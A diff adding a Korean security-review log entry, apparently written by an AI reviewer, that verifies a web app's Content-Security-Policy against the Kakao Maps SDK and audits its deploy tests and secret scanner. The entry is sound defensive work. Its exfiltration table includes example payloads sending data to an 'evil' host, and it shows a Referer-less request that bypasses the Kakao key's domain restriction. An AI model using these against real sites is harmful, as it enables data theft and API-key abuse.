@@ -2094,3 +2094,313 @@ origin 은 공개 저장소이고 커밋은 되돌릴 수 없다.
 2. **SR18-3** — 유출 비밀번호가 아직 커밋 대상 파일에서 복원된다. 계정이 이미 삭제돼
    동작하는 자격증명은 아니므로 차단하지 않았으나, **그 값을 다른 곳에 재사용한 적이 있다면
    판정은 즉시 뒤집힌다.** push 전 1줄 수정을 권고한다.
+
+---
+
+## SR-019 · 2026-07-26 · **G5 배포 직전 최종 보안리뷰 — SR15-4(CSP) 해소 재검증** (security-reviewer, herdr re-review 대행)
+
+**판정: PASS** — **배포를 막을 보안 사유 없음.** SR15-4 **RESOLVED**.
+대상: `deploy/nginx-realestate.conf` · `deploy/DEPLOY.md` · `backend/tests/test_deploy_config.py`(신규) + SR18-3/SEC-3 수정 재확인 + DEC-001 판단
+재현: `cd backend && python -m pytest -q` → **661 tests / 0 failures / 54 skipped = 607 passed** (junit 실측, 지시 수치 일치)
+
+> 결론 요약: 담당자가 "카카오맵 SDK 를 실제로 읽고 정했다"고 한 주장을 **내가 SDK 를 직접 내려받아
+> 대조했다.** 출처 6개 전부, `eval` 1건, XHR 경로, `cssText` 문자열까지 **문자 단위로 일치**했다.
+> 추측으로 적은 출처는 하나도 없다. 나아가 서버 nginx 1.18.0 **격리 인스턴스**로 직접 기동해
+> 200/403/502 전 응답에 CSP 가 붙는 것까지 재현했다.
+> 다만 CSP 가 "세션 라이딩을 막는다"는 표현은 **과하다**(§1-F) — 실제 기여는 다른 데 있다.
+> 그리고 DEC-001 의 보완책 하나(**카카오 JS 키 도메인 제한**)는 **실측 결과 아무것도 막지 않는다**(§4).
+
+---
+
+### 1) CSP 검증 — 담당자 주장을 **원본 대조로** 확인
+
+#### 1-A. SDK 를 직접 내려받아 대조했다
+
+| 받은 것 | 결과 |
+|---|---|
+| `https://t1.daumcdn.net/mapjsapi/js/main/4.5.13/kakao.js` | HTTP 200 · **104,277 B** |
+| `https://t1.daumcdn.net/mapjsapi/js/libs/clusterer/1.1.1/clusterer.js` | HTTP 200 · 10,549 B |
+| `https://dapi.kakao.com/v2/maps/sdk.js?appkey=…&libraries=clusterer` (로더) | HTTP 200 · 3,902 B |
+
+#### 1-B. 출처 6개 — **전부 원본에서 확인** (추측 0건)
+
+| CSP 항목 | 담당자 근거 | 내 대조 결과 |
+|---|---|:--|
+| `script-src dapi.kakao.com` | 로더 sdk.js | `MapView.tsx:38` 이 실제로 이 URL 로 `<script>` 를 붙인다 ✅ |
+| `script-src t1.daumcdn.net` | 로더가 붙이는 kakao.js·clusterer.js | 로더 원문: `p={v3:s+"//t1.daumcdn.net/mapjsapi/js/main/4.5.13/kakao.js", clusterer:s+"//t1.daumcdn.net/mapjsapi/js/libs/clusterer/1.1.1/clusterer.js"}` ✅ **정확히 일치** |
+| `img-src mts.daumcdn.net` | 타일 `/api/v1/tile/` | 로더 원문: `URI_FUNC.ROADMAP=…"mts.daumcdn.net/api/v1/tile/PNGSD02/v21_a63hc/latest/…"`, `ROADMAP_HD=…"PNG02/v21_qgxnj/…"` ✅ |
+| `img-src t1.daumcdn.net` | 마커·컨트롤 스프라이트 | kakao.js: `pa=kc+…"t1.daumcdn.net/mapjsapi/images/"`, `lc=…"t1.daumcdn.net/localimg/localimages/07/mapjsapi/"`. 카카오 로고도 `he=pa+"m_bi_b.png"` ✅ |
+| `img-src s1.daumcdn.net` | 범위 밖 빈 타일 | kakao.js: `$e=kc+(Pb?"ssl.daumcdn.net/":"s1.daumcdn.net/")+"dmaps/apis/"` ✅ |
+| `style-src 'unsafe-inline'` | SDK 의 cssText·setAttribute('style') | `cssText` **10건**, 그중 `a.style.cssText+="left:0;top:0;width:100%;height:100%;touch-action:none"` 는 주석 인용문과 **문자 단위로 동일**. `setAttribute("style", …)` **2건**(SVG 마커 화살표) ✅ |
+
+세 img 출처는 **실제 도달성까지** 확인했다 — 셋 다 `200 image/png`:
+`mts…/tile/PNGSD02/v21_a63hc/latest/3/1/1.png` · `t1…/mapjsapi/images/m_bi_b.png` · `s1…/dmaps/apis/white.png`.
+
+#### 1-C. `'unsafe-eval'` 제외 — **주장 정확**
+
+kakao.js 전체에서 `eval(` 은 **정확히 1건**이고, 그 1건이 바로:
+```js
+try{eval("document.namespaces")}catch(vf){}
+```
+**상수 문자열**이라 동적 코드 실행이 아니고, `try/catch` 안이라 차단돼도 진행된다.
+DEPLOY.md §5-5(4) 표가 "이 위반 1건은 정상이며 이걸 보고 `'unsafe-eval'` 을 넣지 말라"고 못박은 것도 정확하다.
+`new Function` 0건 · `document.write` 0건(로더는 `autoload=false` 라 write 경로를 타지 않는다) — 확인.
+
+#### 1-D. `connect-src 'self'` — **주장 정확**
+
+kakao.js 의 `XMLHttpRequest` 3건을 전부 열어 봤다:
+- 1건은 `Bb=gb&&!O.XMLHttpRequest` — **기능 탐지**(요청 아님)
+- 2건은 **같은 호출부**(로드뷰 `street_view` 검색, `tf=Pb?"https://ssl.daumcdn.net/map2/map/":"https://spi.map.kakao.com/map2/map/"`)
+
+→ **실제 네트워크 호출부는 1개뿐이고 로드뷰 전용**이다. clusterer.js 는 `XMLHttpRequest`·`fetch` **0건**.
+기본 지도 + clusterer 가 XHR 을 하지 않는다는 주장은 사실이다.
+
+#### 1-E. **제외한** 출처가 옳게 제외됐나 (최소권한 반대 방향 검사)
+
+SDK 원문에서 발견되지만 CSP 에 **없는** 호스트를 전부 추적했다 — 전부 **미사용 기능**이라 제외가 옳다:
+
+| 호스트 | 무엇 | 제외 타당성 |
+|---|---|:--|
+| `ctt-image.kakao.com` | `URI_FUNC.TRAFFIC/TRAFFIC_HD` 교통정보 타일 | 교통 레이어 미사용 ✅ |
+| `map0~3.daumcdn.net` | `"map"+(a&3)+".daumcdn.net/map_skyview/L…"` 스카이뷰 타일 | 스카이뷰 미사용(코드에 `MapTypeId`·`setMapTypeId`·`MapTypeControl` **0건**) ✅ |
+| `ssl.daumcdn.net` | `Pb = kakao.maps.TUNNELING` 이 켜졌을 때만 타는 분기 | `TUNNELING` 을 설정하지 않으므로 기본 off ✅ |
+| `rv.map.kakao.com` · `spi.map.kakao.com` | 로드뷰 데이터/타일 | 로드뷰 미사용 ✅ |
+| `map.kakao.com` | 로고 `<a href>`·"카카오맵에서 보기" 링크 | **CSP 대상 아님**(문서 이동은 어떤 지시어도 통제하지 않는다) ✅ |
+| `www.w3.org` | `createElementNS` SVG 네임스페이스 문자열 | 네트워크 요청 아님 ✅ |
+
+**결론: 출처 목록은 과하지도 부족하지도 않다.** 최소권한이 맞다.
+
+#### 1-F. ★ 그런데 "CSP 가 세션 라이딩을 막는다"는 **과한 표현이다** (SR19-4, info)
+
+지시 1번 질문에 정직하게 답한다. **`connect-src 'self'` 는 세션 라이딩을 막지 못한다.**
+
+- 세션 라이딩의 본체는 `fetch('/api/v1/me/profile', {credentials:'include'})` 인데 이건 **같은 오리진**이다.
+  `connect-src 'self'` 는 이것을 **허용**한다. CSP 로는 원리상 막을 수 없다.
+- `X-Requested-With` 요구(SR-016)도 도움이 안 된다 — 주입된 스크립트는 헤더를 그냥 붙이면 된다.
+  그건 고전적 CSRF 방어지 XSS 방어가 아니다.
+
+**CSP 의 실제 기여는 다른 데 있다**: `script-src 'self' + 2개 출처`에 `'unsafe-inline'`·`'unsafe-eval'` 이
+**둘 다 없으므로**, 주입된 인라인 스크립트·`onerror=` 핸들러·`javascript:` URL·`eval` 이 **애초에 실행되지 않는다.**
+즉 CSP 는 "라이딩을 막는" 게 아니라 "**라이딩할 코드가 돌지 못하게** 한다". 이 구분은 중요하다 —
+전자로 적어 두면 다음 사람이 CSP 를 믿고 다른 층을 소홀히 한다.
+
+그리고 스크립트가 어떻게든 돌았다고 가정하면, **CSP 가 못 막는 반출 경로가 남는다**:
+
+| 경로 | 차단? | 비고 |
+|---|:--:|---|
+| `fetch`/XHR/WebSocket/`sendBeacon`/`<a ping>` 외부 전송 | **차단** | `connect-src 'self'` 가 실제로 일하는 지점 |
+| CSS `background:url(https://evil/…)` | **차단** | `img-src` 가 'self'+카카오3 뿐 |
+| `@import` 외부 스타일 · 외부 폰트 | **차단** | `style-src 'self'` · `font-src 'self'` |
+| `<object>`/`<embed>` · `<base>` 하이재킹 · 폼 탈취 · 프레임 삽입 | **차단** | `object-src 'none'` · `base-uri 'none'` · `form-action 'self'` · `frame-ancestors 'none'` |
+| **`location.href = 'https://evil/?d='+data` · `window.open`** | ❌ **안 막힘** | `navigate-to` 지시어는 표준에서 빠져 브라우저에 없다 |
+| **WebRTC `RTCPeerConnection`** | ❌ **안 막힘** | CSP 에 해당 지시어가 아예 없다 |
+
+→ 배포 차단 사유는 아니다(CSP 사양 자체의 한계라 우리가 고칠 수 없다).
+**조치(info)**: `nginx-realestate.conf` 주석과 `test_deploy_config.py` 독스트링의
+"CSP 가 세션 라이딩을 막는다" 표현을 "**주입 코드의 실행을 막아** 세션 라이딩에 이르지 못하게 한다"로 정정.
+
+**이 앱의 실제 XSS 표면은 매우 좁다** — 그래서 CSP 는 진짜로 '2선'이다:
+프론트 전체에 `innerHTML`·`dangerouslySetInnerHTML`·`insertAdjacentHTML`·`eval`·`new Function`·
+`document.write` **사용 0건**(주석으로만 언급). 서버 문자열이 DOM 에 닿는 유일한 경로
+(`mapMarkers.ts` 라벨)는 `row.textContent = line` 이고, 스타일 문자열에 서버 데이터를 넣는 지점도 0건이다.
+
+#### 1-G. `style-src 'unsafe-inline'` 은 수용 가능한가 — **가능하다** (지시 2번)
+
+- **필요성 실증**: 위 1-B 대로 SDK 가 `cssText`(10건)·`setAttribute("style")`(2건)를 쓴다. 빼면 지도가 무너진다.
+  DEPLOY.md 가 "Report-Only 상태에서만 빼 보고 위반이 없으면 빼도 된다"는 재확인 절차까지 남긴 것은 적절하다.
+- **위험도가 낮은 이유** — CSS 주입의 실질 피해는 대부분 **외부 로딩을 통한 반출**인데 그 경로가 전부 닫혀 있다:
+  `img-src`(배경이미지) · `font-src`(폰트) · `style-src`(`@import`) 가 모두 'self'(+카카오 이미지 3) 뿐이다.
+- **주입 지점도 없다**: 우리 코드가 스타일 문자열을 서버 데이터로 조립하지 않는다(위 1-F 실측).
+- 무엇보다 `script-src` 는 조여 있다 — `style-src` 의 `'unsafe-inline'` 은 `script-src` 의 그것과 **위험도가 다르다**.
+
+---
+
+### 2) 배포 절차 (지시 4번) — **안전하다**
+
+| 항목 | 확인 |
+|---|:--|
+| 순서 | 부트스트랩(HTTP 전용) → `certonly --webroot` → 본설정+**Report-Only** → 브라우저 확인 → 강제 → 갱신 확인 |
+| `--nginx` 미사용 | ✅ 동거 서비스 설정 자동수정 위험을 피한 판단이 옳다 |
+| 모든 reload 앞에 `nginx -t` | ✅ 실패 시 "손으로 고치지 말고 되돌린 뒤 보고" 명시 |
+| Report-Only 치환 검증 | ✅ `grep -c` 가 **3** 이 아니면 진행 금지 (블록 3개와 일치) |
+| 강제 전환 방식 | ✅ sed 를 되돌리는 게 아니라 **저장소 원본을 다시 복사**(원본이 강제 상태) → 되돌림 실수 구조적 차단, `grep -c … = 0` 검증 |
+| **되돌리기 경로** | ✅ 2개 — (a) Report-Only 재적용((3)으로) (b) `rm /etc/nginx/sites-enabled/realestate.conf` + reload |
+| `report-uri` 없음 | 수용 — 수집 엔드포인트 부재 + 디스크 87% + 1인 서비스. 대신 §5-5(4)가 **브라우저 콘솔 육안 확인**을 절차로 강제 |
+
+**내가 직접 재현했다** — 서버 nginx 1.18.0 **격리 인스턴스**(임시 prefix·자체 pid/log·`127.0.0.1:18443`),
+`/etc/nginx` 및 동거 서비스 **무변경**(사후 `sites-enabled` 목록 동일 확인), 임시물 전량 삭제:
+
+```
+(1) nginx -t (강제판)      → syntax is ok / test is successful
+(2) Report-Only 치환       → 3건, nginx -t 도 통과
+(3) 격리 기동 후 응답별 헤더:
+    403  CSP=1  보안헤더5종중=5  /
+    403  CSP=1  보안헤더5종중=5  /index.html
+    403  CSP=1  보안헤더5종중=5  /assets/a.css
+    502  CSP=1  보안헤더5종중=5  /api/v1/health
+    403  CSP=1  보안헤더5종중=5  /nope-404
+```
+**오류 응답(403·502)에도 CSP 가 정확히 1개씩** 붙는다 — `always` 가 실제로 동작함을 실측했다.
+CSP 값이 `map` 하나에서 오므로 세 블록의 값이 갈라질 수 없다는 설계도 확인된다.
+
+---
+
+### 3) `test_deploy_config.py` 자기충족성 (지시 5번) — 변이 18종 중 **16종 탐지**
+
+| 변이 | 탐지 |
+|---|:--:|
+| M1 CSP 헤더를 한 블록에서 제거 | ✅ 2건 FAIL |
+| M2 `'unsafe-eval'` 추가 / M3 `'unsafe-inline'` 추가(script) | ✅ |
+| M4 `always` 제거 | ✅ 2건 |
+| M5 한 블록만 값 하드코딩(변수 참조 깨기) | ✅ |
+| M6 `mts.daumcdn.net` 제거 / M7 `t1.daumcdn.net` 제거 / M8 style `'unsafe-inline'` 제거 | ✅ |
+| M9 `connect-src *` / M10 `connect-src` 에 외부 출처 추가 | ✅ |
+| M13 `frame-ancestors 'self'` / M14 `base-uri` 제거 / M15 `object-src 'self'` / M16 `default-src *` | ✅ |
+| M17 `check_headers()` 에서 CSP 제거 / M18 Report-Only 절차 삭제 | ✅ |
+| **M11 `script-src` 에 `https://cdn.jsdelivr.net` 추가** | ❌ **미탐지** |
+| **M12 `img-src` 에 `data:` 추가** | ❌ **미탐지** |
+
+**SR19-2 (low)**: 테스트는 "필요한 출처가 **있는가**"만 본다. **집합이 정확한가**는 아무도 안 본다.
+그래서 출처를 **좁히는**(지도가 죽는) 실수는 전부 잡지만, **넓히는**(방어가 새는) 변경은 통과한다.
+`script-src` 는 이 CSP 방어의 핵심이라 이 방향이 더 위험하다.
+**조치**: 지시어별 **정확한 집합 일치**를 단언하는 테스트 1건 추가
+(`set(_directive("script-src")) == {"'self'", "https://dapi.kakao.com", "https://t1.daumcdn.net"}`).
+원복 후 재실행 0 FAIL 확인. 변이에 쓴 두 파일은 **바이트 단위로 원복**했다(LF 유지 확인).
+
+---
+
+### 4) ★ 카카오 JS 키 도메인 제한이 **실효가 없다** (SR19-1, medium · DEC-001 정정 필요)
+
+DEC-001 이 보완책으로 기록한 "카카오 JS 키: 허용 도메인 제한 등록(realestate.utilverse.info, 사용자 완료)"을
+**실측으로 검증했다.** 12:44 와 12:51 두 번, 결과 동일:
+
+| 요청 | 결과 |
+|---|:--|
+| `Referer` **없음** | **HTTP 200** — SDK 본문 정상 반환 (**내 PC 에서**) |
+| `Referer: https://realestate.utilverse.info/` | **HTTP 401** `{"errorType":"AccessDeniedError","message":"domain mismatched! caller=https://realestate.utilverse.info. check out registered web domains."}` |
+| `Referer: http://realestate.utilverse.info` · `https://utilverse.info` · `http://localhost:5173` | 전부 **401** |
+
+**두 가지가 동시에 사실이다:**
+
+1. **등록된 허용목록에 운영 도메인이 없다.** 카카오가 우리 도메인을 이름까지 찍어 "mismatched" 라고 답한다.
+2. **그런데도 지도는 뜬다** — 우리 nginx 가 `Referrer-Policy: no-referrer` 를 주므로 브라우저가
+   SDK 요청에 Referer 를 **안 싣고**, 카카오는 Referer 가 없으면 통과시킨다(위 200).
+
+따라서:
+
+- **(a) 보완책이 아무것도 막지 않는다.** 내가 내 PC 에서 우리 키로 200 을 받았다.
+  누구든 `no-referrer` 로 요청하면 우리 키를 쓸 수 있다 → DEC-001 이 수용한 잔여위험
+  (**한도 소진**)이 이 통제로 줄어들지 않는다. 기록을 정정해야 한다.
+- **(b) 숨은 결합이 생겼다.** 지금 지도가 사는 이유가 `no-referrer` 다. 누군가 보안을 "개선"하려고
+  `Referrer-Policy` 를 `strict-origin-when-cross-origin` 등으로 바꾸면 **그 순간 지도가 죽는다.**
+  아무도 그 인과를 모르는 상태로 남으면 안 된다.
+
+**배포 차단은 아니다** — 피해 상한이 DEC-001 이 이미 수용한 "한도 소진"과 동일하고, 우리 데이터·세션과
+무관하다. 다만 **사용자가 이 보완책을 근거의 하나로 삼아 위험을 수용했으므로 반드시 알려야 한다.**
+
+**조치**: ① 카카오 개발자 콘솔에서 웹 플랫폼 도메인에 `https://realestate.utilverse.info` 가 실제로
+등록됐는지 재확인(오타·다른 앱에 등록 가능성) ② 등록이 끝나도 `no-referrer` 우회는 남으므로
+DEC-001 의 보완책 목록에서 이 항목의 실효성을 **하향 기재** ③ `Referrer-Policy` 와 지도 동작의
+결합을 `nginx-realestate.conf` 주석에 1줄 남길 것.
+
+**DEC-001 자체 판단: 배포 차단 사유 아님.** 두 키 모두 조회 전용, 최대 피해는 일일 한도 소진,
+사용자 명시 결정 + 재검토 조건 기재. 보완책 4개 중 **3개(마스킹 · gitignore+600 · 위생 테스트)는
+내가 실동작을 확인**했고, 1개(도메인 제한)만 위와 같이 무효다.
+
+---
+
+### 5) SR18-3 / SEC-3 재확인 (지시 6번) — **해소**
+
+- **유출값 저장소 전수 0건**: `Recommend-2026`·`verify-Recommend` 로 `.git` 제외 전 파일 검색 → **0건**
+  (리뷰 로그 인용본 포함 제거 확인).
+- **형태 기반 검사기로 교체 확인**: 특정 값을 쫓지 않고 `_SECRET_ASSIGN` 패턴으로 형태를 본다.
+  `[a-z_]*(password|…)` 로 `TEST_PASSWORD` 같은 **접두사 이름**까지 잡도록 고친 것도 확인.
+- **SEC-3(`fullmatch`) 수정 실효 확인** — 진짜 유출 7종을 문서에 심어 재현:
+
+| 심은 것 | 잡혔나 |
+|---|:--:|
+| `TEST_PASSWORD` 상수에 특수문자 섞인 20자 값 대입 | ✅ |
+| MOLIT 인증키 형태(base64 88자, `%2B`·`%3D` 포함) | ✅ |
+| 카카오 REST 키 형태(32자 hex) | ✅ |
+| `POSTGRES_PASSWORD=` 형태로 특수문자 섞인 20자 값 인라인 | ✅ |
+| **SEC-3 회귀①** 진짜 키 안에 `test` 가 우연히 포함 | ✅ **잡힘** |
+| **SEC-3 회귀②** 진짜 비밀번호에 `sample` 포함 | ✅ **잡힘** |
+| **산문 인용**: "계정 비밀번호는 `<SR17-2 유출값>` 였다" 형태(구분자 `=`·`:` 없음) | ❌ **놓침** |
+
+자리표시자 3종(`EXAMPLE_KEY_1234`, `<채워넣기>`, 환경변수 이름만 언급)은 **정상적으로 면제** — 오탐 0.
+
+> **덤으로 실전 검증이 됐다.** 이 SR-019 초안에 위 표를 쓰면서 예시 값을 그럴듯한 형태로 적었더니
+> `test_docs_and_config_do_not_contain_secret_values` 가 **내 리뷰 로그 2줄을 즉시 잡아냈다**
+> (`security-review-log.md:2322`, `:2325`). 검사기가 리뷰어 자신의 문서에도 실제로 작동한다는
+> 뜻이다 — SR17-2 가 바로 '리뷰 로그가 값을 인용해 유출된' 사고였으므로 정확히 맞는 그물이다.
+> 해당 두 줄은 값을 적지 않는 서술로 고쳤다.
+
+**SR19-3 (low)**: 마지막 1종을 놓친다. `_SECRET_ASSIGN` 이 `이름 [=:] 값` 형태를 요구하는데,
+한국어 산문("계정 비밀번호는 `…` 였다")에는 그 구분자가 없다. **하필 이것이 SR17-2 의 원래 형태다** —
+리뷰 로그가 결함을 설명하려고 값을 인용한 그 모습. 즉 교체로 **일반성은 얻고 원래 사례는 놓쳤다.**
+현재 실제 위반은 0건이라 비차단.
+**조치**: 형태 검사를 유지하되 **알려진 유출값의 `sha256` 지문 목록**을 함께 두고 대조한다
+(평문을 저장소에 남기지 않으면서 특정 값도 잡힌다 — SR-018 이 권고한 형태). 한국어 키워드
+(`비밀번호`·`인증키`)를 `_SECRET_ASSIGN` 에 추가하는 것도 값싸다.
+
+---
+
+### 6) 그 밖에 배포를 막을 보안 사유가 있나 (지시 7번) — **없다**
+
+| 항목 | 상태 |
+|---|:--|
+| 보안 관련 테스트 190건(`test_deploy_config`·`test_script_hygiene`·`test_masking`·`test_security`·`test_api`·`test_agents`) | **0 fail** |
+| DB 포트 미개방 | ✅ 서버 `ss -tlnp` 에 5432 리스너 **0**, `realestate-db-1` Ports 공란 |
+| `.env` 권한 | ✅ 600 root:root |
+| 비밀값 커밋 유출 | ✅ SR-018 에서 전수 0건 · 이번 라운드 유출값 재검색 0건 |
+| IDOR · SR4-2 · 필드 암호화 | ✅ SR-018 확인분 무변경(관련 테스트 통과) |
+| 동거 서비스 | ✅ `itsmine-*`·`autobtc` **조회·격리검증만** — 중지·재시작·설정변경 **0회**, `/etc/nginx` 무변경 |
+
+**비보안 관찰 2건(참고)**
+
+1. **리뷰 중 트리가 움직였다.** 시작 시점엔 지시대로 607 passed/54 skipped 였는데, 12:53 경
+   다른 작업(`backend/app/ingest/geocode.py`·`frontend/src/lib/mapMarkers.ts` — GEO-7 스윕)이
+   들어오며 전체 스위트가 일시적으로 **red**(1건 → 다른 2건)였다가 12:55 에 **green 복귀**
+   (661 tests / 0 fail / 54 skip = 607 passed). 보안 관련 190건은 전 구간 0 fail 이었다.
+   → G5 는 "**이 트리를** 배포"하는 행위다. **배포 직전 트리 동결 + 최종 그린 1회 확인**을 권고한다.
+2. `GEO-7`(medium, `blocks: G5 배포 전 필수`)이 아직 OPEN 이다 — 좌표 정확성 문제라
+   **보안 판정 대상이 아니다.** 코드리뷰 소관이며, 배포 전 그쪽 판단이 필요하다.
+
+**미사용 서드파티 스크립트(SR19-5, info)**: `MapView.tsx` 가 `libraries=clusterer` 로 clusterer.js
+(10.5KB)를 받지만, 프론트에서 `MarkerClusterer` 를 **한 번도 쓰지 않는다**(자체 클러스터링 사용 —
+저장소 전수 grep 결과 `clusterer` 언급은 로더 URL 1줄뿐). CSP 는 넓어지지 않지만(같은 `t1.daumcdn.net`)
+불필요한 외부 스크립트를 1개 덜 실행하는 편이 낫다 → `&libraries=clusterer` 제거 검토.
+
+---
+
+### 신규 발견 요약
+
+| ID | 심각도 | 제목 | 차단 |
+|---|:--:|---|:--:|
+| `SR19-1` | **medium** | 카카오 JS 키 도메인 제한이 실효 없음 — 운영 도메인이 허용목록에 없고, `no-referrer` 요청은 통과. DEC-001 보완책 기록 정정 필요 + `Referrer-Policy` 와 지도 동작의 숨은 결합 | 비차단 |
+| `SR19-2` | low | `test_deploy_config.py` 가 CSP 출처를 **넓히는** 변경을 못 잡는다(변이 M11·M12 미탐지) | 비차단 |
+| `SR19-3` | low | 새 위생 검사기가 **산문에 인용된 비밀**을 놓친다 — 하필 SR17-2 의 원래 형태 | 비차단 |
+| `SR19-4` | info | "CSP 가 세션 라이딩을 막는다" 표현 과장 — 실제 기여는 주입 코드의 **실행 차단**. navigation·WebRTC 반출은 CSP 사양상 못 막음 | 비차단 |
+| `SR19-5` | info | `libraries=clusterer` 를 받지만 `MarkerClusterer` 미사용 | 비차단 |
+
+### CLOSE 처리
+
+`SR15-4` **RESOLVED** (CSP 도입·검증 완료 — 원본 대조 + 격리 nginx 실측) ·
+`SR18-3` **RESOLVED** (유출값 저장소 0건 + 형태 기반 검사기 실효 확인) ·
+`SEC-3` **RESOLVED** (`fullmatch` 수정, 회귀 2케이스 모두 탐지)
+
+### 판정
+
+**PASS — 배포를 막을 보안 사유 없음. `deploy_approved: true`** (아래 2가지 확인 후 실행 권고)
+
+SR15-4 는 "헤더를 붙였다"가 아니라 **"왜 이 출처인지"를 원본으로 증명한** 드문 수준의 작업이다.
+담당자의 SDK 확인 주장은 **하나도 빠짐없이 사실**이었고, 최소권한 방향(과함·부족함) 양쪽에서 검증했다.
+절차도 Report-Only 선행 · `nginx -t` 게이트 · 되돌림 2경로로 안전하다.
+
+**실행 전 확인 2건(보안 차단 아님, 운영 판단)**
+1. **트리 동결 후 최종 그린 1회** — 리뷰 중 다른 작업이 들어와 스위트가 일시 red 였다(§6).
+2. **`GEO-7`** — 코드리뷰 소관의 좌표 정확성 항목이 `G5 배포 전 필수`로 열려 있다.
+
+**사용자에게 올릴 것**: `SR19-1` — DEC-001 의 보완책 "카카오 JS 키 도메인 제한"은 **실측상 아무것도
+막지 않는다.** 위험 수용 결정 자체는 유효하지만(피해 상한 = 한도 소진), 결정의 근거 하나가 사실과
+다르므로 기록을 정정하고 콘솔 등록 상태를 재확인해야 한다.
